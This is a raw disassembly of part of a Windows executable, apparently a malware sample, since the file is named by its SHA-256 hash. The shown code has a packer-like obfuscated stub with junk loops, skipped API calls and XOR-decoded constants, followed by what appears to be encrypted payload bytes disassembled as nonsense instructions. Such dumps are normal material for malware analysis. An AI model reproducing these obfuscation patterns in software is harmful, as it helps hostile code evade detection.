
3993f52eebea5e8e5e9d610bad0a9b355ca472bf1607119f5ba0de1c6e5bb306.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0x4b6bc454
  40157e:	mov    dh,0x7e
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [edx-0x75],eax
  401596:	mov    cl,BYTE PTR [ebx+0x1d22b38a]
  40159c:	(bad)  
  40159d:	xchg   ecx,eax
  40159e:	test   eax,0x51987e88
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x215c06c4],0x1b
  40162d:	jg     0x401644
  40162f:	mov    edx,0x5574d19
  401634:	test   al,0x1f
  401636:	test   al,0xc7
  401638:	lods   eax,DWORD PTR ds:[esi]
  401639:	adc    ch,ah
  40163b:	arpl   WORD PTR [edi],ax
  40163d:	sbb    BYTE PTR [edi+0x32d3339b],al
  401643:	jmp    0xf8cee0a4
  401648:	cmp    edi,DWORD PTR [ebx+edi*1-0x29c13dc5]
  40164f:	sbb    DWORD PTR [edx+0x0],eax
  401652:	mov    al,ds:0x22668609
  401657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401658:	aas    
  401659:	popf   
  40165a:	xrelease xchg BYTE PTR [ebx+0x6ad73aa6],ch
  401661:	ins    DWORD PTR es:[edi],dx
  401662:	mov    ss,edx
  401664:	stc    
  401665:	dec    edx
  401666:	xor    bl,cl
  401668:	das    
  401669:	std    
  40166a:	aas    
  40166b:	pusha  
  40166c:	add    ecx,DWORD PTR [ebx+0x6a4a47f7]
  401672:	dec    ecx
  401673:	mov    dl,BYTE PTR [ecx]
  401675:	sar    BYTE PTR [ebp-0x545558cd],cl
  40167b:	sub    esp,DWORD PTR [esp+eax*1]
  40167e:	out    dx,eax
  40167f:	inc    ebx
  401680:	enter  0x67d1,0xb1
  401684:	sbb    eax,0xbbc9c6f2
  401689:	cdq    
  40168a:	push   edi
  40168b:	(bad)  
  40168c:	cld    
  40168d:	cmp    esi,DWORD PTR [edx]
  40168f:	ins    BYTE PTR es:[edi],dx
  401690:	scas   eax,DWORD PTR es:[edi]
  401691:	mov    bl,0x54
  401693:	xchg   esp,eax
  401694:	in     al,0x48
  401696:	rcl    edi,1
  401698:	cmp    eax,0x6fd43a59
  40169d:	adc    ebx,DWORD PTR [esp+eax*1-0x6e884f95]
  4016a4:	mov    al,0xcd
  4016a6:	xor    BYTE PTR [ebx],cl
  4016a8:	mov    ch,0x2
  4016aa:	push   ecx
  4016ab:	mov    ch,0xed
  4016ad:	iret   
  4016ae:	call   0xbbf2993f
  4016b3:	and    BYTE PTR [ebx-0x28],ch
  4016b6:	dec    ecx
  4016b7:	hlt    
  4016b8:	dec    esi
  4016b9:	loope  0x4016a0
  4016bb:	imul   ebx,DWORD PTR [ecx+0x5],0xd5724838
  4016c2:	xor    BYTE PTR [eax+0x6f],cl
  4016c5:	pop    ecx
  4016c6:	or     BYTE PTR [eax],ch
  4016c8:	cmp    ch,0x15
  4016cb:	test   BYTE PTR [edx+0x4edf67d2],ah
  4016d1:	lock xchg ebp,eax
  4016d3:	aas    
  4016d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016d5:	mov    bh,0x45
  4016d7:	(bad)  
  4016d8:	stos   DWORD PTR es:[edi],eax
  4016d9:	shr    BYTE PTR [esi],cl
  4016db:	stos   DWORD PTR es:[edi],eax
  4016dc:	nop
  4016dd:	retf   0x8a95
  4016e0:	popf   
  4016e1:	stc    
  4016e2:	adc    DWORD PTR [ebx-0x28],edi
  4016e5:	push   esi
  4016e6:	pop    ds
  4016e7:	shr    dl,cl
  4016e9:	cmp    bl,BYTE PTR [ebx]
  4016eb:	test   cl,ah
  4016ed:	cwde   
  4016ee:	out    0xd8,al
  4016f0:	or     edx,ecx
  4016f2:	lock cmppd xmm1,XMMWORD PTR [ebp-0x60],0xad
  4016f9:	xchg   edi,eax
  4016fa:	retf   0x5c6c
  4016fd:	add    DWORD PTR [ecx+ecx*4-0xb],eax
  401701:	xor    eax,0xe9790711
  401706:	stos   DWORD PTR es:[edi],eax
  401707:	ds dec ebx
  401709:	xchg   edi,eax
  40170a:	inc    ebp
  40170c:	dec    ebx
  40170d:	sbb    ah,al
  40170f:	lea    edi,[edx+0x22]
  401712:	mov    ebx,0xca2e4027
  401718:	mov    cl,0x3b
  40171a:	jge    0x401755
  40171c:	push   es
  40171d:	dec    ebx
  40171e:	inc    ecx
  40171f:	aaa    
  401720:	or     eax,0xa58f5739
  401725:	stos   BYTE PTR es:[edi],al
  401726:	pop    ebp
  401727:	inc    esi
  401728:	and    al,BYTE PTR [edi+0x19]
  40172b:	jle    0x401716
  40172d:	inc    ecx
  40172e:	lods   eax,DWORD PTR ds:[esi]
  40172f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401730:	dec    esi
  401731:	bound  ecx,QWORD PTR [esi+0x74]
  401734:	cmp    BYTE PTR [esi+0x8970b20],al
  40173a:	call   0x427d:0xbb099a2c
  401741:	sub    DWORD PTR [esi+0x25],esp
  401744:	adc    al,0xe5
  401746:	mov    ecx,0xaecba586
  40174b:	cmc    
  40174c:	rcl    BYTE PTR ds:0xeac5744c,0xf6
  401753:	add    eax,0x938d3b83
  401758:	sub    DWORD PTR [ecx],esp
  40175a:	or     dh,bh
  40175c:	adc    edi,DWORD PTR [ebx-0x4ff7053d]
  401762:	inc    esi
  401763:	ret    0x1f38
  401766:	aam    0xff
  401768:	mov    al,0xd7
  40176a:	aaa    
  40176b:	add    ebp,DWORD PTR [edi]
  40176d:	out    0x32,al
  40176f:	stc    
  401770:	loopne 0x401755
  401772:	popa   
  401773:	push   0xaf519cb7
  401778:	fstp   DWORD PTR ss:[eax+0x32b725f3]
  40177f:	stc    
  401780:	or     eax,ebp
  401782:	je     0x401788
  401784:	xchg   ebx,eax
  401785:	adc    al,0x18
  401787:	out    0x79,eax
  401789:	or     eax,0xf6804995
  40178e:	inc    esp
  40178f:	jp     0x40174b
  401791:	dec    edi
  401792:	scas   eax,DWORD PTR es:[edi]
  401793:	arpl   WORD PTR [eax-0xf],sp
  401796:	rcl    DWORD PTR [ebx-0xee5647f],0x99
  40179d:	les    ecx,FWORD PTR [esi]
  40179f:	cmp    eax,0x9730d36f
  4017a4:	add    eax,0xdf94ef27
  4017a9:	pop    es
  4017aa:	and    ebp,esi
  4017ac:	mul    DWORD PTR [ecx+0x3882f529]
  4017b2:	and    ah,BYTE PTR [edx-0x4]
  4017b5:	call   0xd8b3:0x8bfabb9b
  4017bc:	push   ecx
  4017bd:	aad    0xf7
  4017bf:	jmp    0x40180e
  4017c1:	mov    eax,0xd4b41e90
  4017c6:	xor    esp,DWORD PTR [eax-0x24805a18]
  4017cc:	mov    bl,0xf1
  4017ce:	sub    al,bh
  4017d0:	xor    eax,0x56a10453
  4017d5:	ret    0x9e3d
  4017d8:	js     0x4017c1
  4017da:	int    0x8b
  4017dc:	icebp  
  4017dd:	outs   dx,DWORD PTR ds:[esi]
  4017de:	je     0x401837
  4017e0:	pushw  cs
  4017e2:	mov    dh,dl
  4017e4:	mov    BYTE PTR [ecx],dl
  4017e6:	sti    
  4017e7:	jmp    0x98a0da1b
  4017ec:	data16 fsub QWORD PTR [ecx+ebp*8+0x7b386c5e]
  4017f4:	adc    DWORD PTR [eax-0x706dbe2e],eax
  4017fa:	push   ecx
  4017fb:	clc    
  4017fc:	add    DWORD PTR [edx-0x3bb0073],ecx
  401802:	int    0x15
  401804:	push   ebp
  401805:	gs ins DWORD PTR es:[edi],dx
  401807:	push   0xfffffff9
  401809:	(bad)  
  40180a:	jp     0x401887
  40180c:	ret    
  40180d:	mov    eax,0x3ecee203
  401812:	mov    esi,0xdfd02b18
  401817:	es add al,0x82
  40181a:	add    dl,BYTE PTR [ebx-0x37750e]
  401820:	into   
  401821:	xchg   bh,dl
  401823:	aad    0x70
  401825:	add    BYTE PTR [ecx+0x7a],0x14
  401829:	pop    edi
  40182a:	mov    ebx,0x80a0af37
  40182f:	(bad)  
  401830:	and    al,0x34
  401832:	dec    edx
  401833:	shl    DWORD PTR [eax-0x40c3cebe],0x61
  40183a:	dec    ebx
  40183b:	test   DWORD PTR [edx+eiz*2-0x4],ebx
  40183f:	sub    dh,ah
  401841:	lock jge 0x401804
  401844:	repnz mov al,0x77
  401847:	add    DWORD PTR [ecx],eax
  401849:	int3   
  40184a:	scas   eax,DWORD PTR es:[edi]
  40184b:	(bad)  
  40184c:	ficomp DWORD PTR [ebp-0x68]
  40184f:	popf   
  401850:	rcr    DWORD PTR [edi-0x2b],1
  401853:	aaa    
  401854:	adc    esi,esp
  401856:	xchg   ebp,eax
  401857:	sbb    DWORD PTR [ebp+edx*2-0x3c3b8b2c],edx
  40185e:	dec    ebx
  40185f:	sub    BYTE PTR [ebx+0x78],al
  401862:	out    0xf7,al
  401864:	xchg   ecx,eax
  401865:	(bad)  
  401866:	cmp    BYTE PTR [ebx-0xc],ch
  401869:	inc    ebx
  40186a:	jecxz  0x40189e
  40186c:	pushf  
  40186d:	shl    edx,0x80
  401870:	jmp    0x6515:0xba02d176
  401877:	aaa    
  401878:	xor    al,0xe4
  40187a:	stc    
  40187b:	adc    al,0x31
  40187d:	xor    ecx,DWORD PTR [edx+0x2fa584f7]
  401883:	(bad)  
  401884:	shl    WORD PTR ds:[esi+ebx*1+0x3333d03c],0xdf
  40188e:	push   edx
  40188f:	pop    ebx
  401890:	fucomip st,st(1)
  401892:	mov    WORD PTR [edi+esi*8],gs
  401895:	jno    0x40188d
  401897:	pushf  
  401898:	lahf   
  401899:	stos   BYTE PTR es:[edi],al
  40189a:	mov    edi,0x48539889
  40189f:	imul   eax,ebx,0xb11c4d69
  4018a5:	jns    0x4018ee
  4018a7:	cmp    al,0x74
  4018a9:	cld    
  4018aa:	ins    DWORD PTR es:[edi],dx
  4018ab:	mov    bl,0xe4
  4018ad:	cld    
  4018ae:	jns    0x40188f
  4018b0:	pop    edx
  4018b1:	js     0x4018d4
  4018b3:	lds    edi,FWORD PTR [eax+0x1e]
  4018b6:	ins    BYTE PTR es:[edi],dx
  4018b7:	(bad)  
  4018b8:	sub    DWORD PTR [esi+eax*4+0x7c],ebp
  4018bc:	push   edx
  4018bd:	sub    al,0x74
  4018bf:	push   eax
  4018c0:	fisubr DWORD PTR [edi+0x69f1cd1a]
  4018c6:	and    BYTE PTR [ebx+0x31],bl
  4018c9:	clc    
  4018ca:	adc    ah,BYTE PTR [ebx+0x66]
  4018cd:	sub    ah,BYTE PTR [edx+ecx*8]
  4018d0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018d2:	push   ebp
  4018d3:	fisttp WORD PTR [edi+0x2f]
  4018d6:	call   0xc83a82fc
  4018db:	enter  0xd51e,0xe9
  4018df:	fs pusha 
  4018e1:	adc    edx,ebx
  4018e3:	mov    ds:0x5c4dda78,al
  4018e8:	lea    ebp,[ebp-0x73e945bf]
  4018ee:	inc    eax
  4018ef:	and    BYTE PTR [esi],dl
  4018f1:	or     DWORD PTR [eax-0x30a335ef],ebx
  4018f7:	pop    esi
  4018f8:	mov    dh,0xa1
  4018fa:	imul   ecx,DWORD PTR [ecx-0x3],0x9998acf9
  401901:	addr16 stc 
  401903:	shl    BYTE PTR [edx+ecx*8+0x4e7f714e],1
  40190a:	sbb    eax,DWORD PTR [ebp+ecx*2-0x36514cb1]
  401911:	cmc    
  401912:	push   0xc8e61d20
  401917:	loop   0x4018c1
  401919:	adc    BYTE PTR [ecx-0x7ca8b89b],0xac
  401920:	push   0xffffffb3
  401922:	jmp    0x1889:0x5582bf0e
  401929:	(bad)  
  40192a:	sub    al,0x21
  40192c:	ins    BYTE PTR es:[edi],dx
  40192d:	inc    edx
  40192e:	aad    0x1f
  401930:	ins    DWORD PTR es:[edi],dx
  401931:	out    0x4c,eax
  401933:	pop    DWORD PTR [ebx+0x384beee7]
  401939:	push   ds
  40193a:	dec    eax
  40193b:	mov    ds:0x8da07eb2,al
  401940:	in     al,0x9b
  401942:	jp     0x4019aa
  401944:	dec    edi
  401945:	ds cwde 
  401947:	fdiv   st(4),st
  401949:	jne    0x401998
  40194b:	fsubr  QWORD PTR [edi]
  40194d:	iret   
  40194e:	pop    ecx
  40194f:	dec    esp
  401950:	cs test eax,0x2615fe58
  401956:	outs   dx,DWORD PTR ds:[esi]
  401957:	dec    edi
  401958:	sub    edx,ebp
  40195a:	cld    
  40195b:	jp     0x40199d
  40195d:	rcl    dl,cl
  40195f:	ss push ds
  401961:	lock push ecx
  401963:	fnstenv [esi+0x61e12257]
  401969:	retf   0xdcda
  40196c:	(bad)  
  40196d:	xchg   ecx,eax
  40196e:	fcmove st,st(0)
  401970:	pop    es
  401971:	in     al,0xef
  401973:	shl    DWORD PTR [ebp+0x9a53c96],cl
  401979:	or     BYTE PTR [ebp+0x4e],cl
  40197c:	(bad)  
  40197d:	lods   eax,DWORD PTR ds:[esi]
  40197e:	je     0x40199e
  401980:	push   0xe4069753
  401985:	in     al,dx
  401986:	rcl    BYTE PTR [ebx],0x4c
  401989:	add    WORD PTR [ebx-0x114e360a],0xffa2
  401991:	sbb    bl,BYTE PTR [ecx+0x77]
  401994:	je     0x4019f5
  401996:	ret    
  401997:	shl    edx,cl
  401999:	in     al,0xf7
  40199b:	nop
  40199c:	push   es
  40199d:	push   ds
  40199e:	and    dl,dh
  4019a0:	jne    0x401a13
  4019a2:	xor    dh,ah
  4019a4:	sti    
  4019a5:	out    0x37,eax
  4019a7:	inc    ecx
  4019a8:	cmp    DWORD PTR [eax-0x5b],ebx
  4019ab:	add    DWORD PTR [eax+0x787fb992],ebx
  4019b1:	xchg   esp,eax
  4019b2:	or     eax,0xf865e1ed
  4019b7:	jge    0x4019d9
  4019b9:	(bad)  
  4019ba:	jmp    0xb8e4:0xbcf60546
  4019c1:	xchg   esp,eax
  4019c2:	xchg   DWORD PTR [edi+0x70f8ad1d],eax
  4019c8:	sub    eax,0x7332dd92
  4019cd:	pusha  
  4019ce:	dec    eax
  4019cf:	mov    cs,WORD PTR [edx+0x68]
  4019d2:	mov    ecx,0x2a39090e
  4019d7:	push   edi
  4019d8:	add    BYTE PTR [ebp-0x6f321621],bl
  4019de:	imul   ebx,DWORD PTR [esi-0x24],0x51
  4019e2:	inc    edi
  4019e3:	and    ecx,DWORD PTR [eax-0x17]
  4019e6:	sbb    al,0x2d
  4019e8:	ficomp DWORD PTR [ecx]
  4019ea:	sar    DWORD PTR [ebx],cl
  4019ec:	add    DWORD PTR [edx-0x4bdf6a9b],edx
  4019f2:	pop    ss
  4019f3:	mov    ebp,?
  4019f5:	pushf  
  4019f6:	retf   
  4019f7:	outs   dx,DWORD PTR ds:[esi]
  4019f8:	imul   esi,DWORD PTR [eax+0x1f],0xfffffff4
  4019fc:	ds or  al,ch
  4019ff:	jge    0x401a18
  401a01:	jle    0x4019ec
  401a03:	jo     0x4019d0
  401a05:	or     BYTE PTR [ebx+0x6d],al
